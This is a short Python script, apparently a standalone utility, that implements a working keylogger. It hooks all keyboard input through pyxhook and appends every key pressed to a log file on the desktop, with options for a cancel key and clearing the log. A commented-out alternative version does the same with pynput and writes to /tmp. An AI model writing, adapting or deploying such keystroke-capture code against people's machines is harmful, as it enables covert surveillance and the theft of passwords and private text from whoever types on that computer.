import os 
import pyxhook 
  
log_file = os.environ.get( 
    'pylogger_file', 
    os.path.expanduser('~/Desktop/file.log') 
) 
cancel_key = ord( 
    os.environ.get( 
        'pylogger_cancel', 
        '`'
    )[0] 
) 
if os.environ.get('pylogger_clean', None) is not None: 
    try: 
        os.remove(log_file) 
    except EnvironmentError: 
     pass
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}\n'.format(event.Key)) 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
new_hook.HookKeyboard() 
try: 
    new_hook.start()         
except KeyboardInterrupt: 
    pass
except Exception as ex: 
    
    msg = 'Error while catching events:\n  {}'.format(ex) 
    pyxhook.print_err(msg) 
    with open(log_file, 'a') as f: 
        f.write('\n{}'.format(msg)) 


# from pynput.keyboard import Listener
# import re

# logFile = '/tmp/key.log'


# def capturar(tecla):
#     tecla = str(tecla)
#     tecla = re.sub(r'\'', '', tecla)
#     tecla = re.sub(r'Key.space', ' ', tecla)
#     tecla = re.sub(r'Key.enter', '\n', tecla)
#     tecla = re.sub(r'Key.*', '', tecla)

#     with open(logFile, 'a') as log:
#         log.write(tecla)


# with Listener(on_press=capturar) as l:
#     l.join()
